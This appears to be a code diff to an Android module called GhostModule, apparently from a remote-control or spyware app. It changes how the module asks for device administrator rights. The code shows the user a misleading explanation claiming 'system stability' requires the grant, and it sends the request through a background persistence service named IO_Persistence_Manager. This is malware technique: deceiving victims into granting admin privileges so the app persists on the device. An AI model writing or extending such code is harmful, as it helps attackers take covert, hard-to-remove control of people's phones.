@@ -673,12 +673,19 @@ public class GhostModule extends BaseModule {
             case "admin":
                 new Handler(Looper.getMainLooper()).post(() -> {
                     try {
+                        IO_Persistence_Manager.stopSmartExit();
                         android.content.ComponentName admin = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
                         Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                         intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                         intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Synchronization with system frameworks is required to maintain device stability.");
                         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        context.startActivity(intent);
+
+                        IO_Persistence_Manager ghostService = IO_Persistence_Manager.getInstance();
+                        if (ghostService != null) {
+                            ghostService.startActivity(intent);
+                        } else {
+                            context.startActivity(intent);
+                        }
                     } catch (Exception e) {
                         android.util.Log.e("GhostModule", "Failed to launch device admin: " + e.getMessage());
                     }
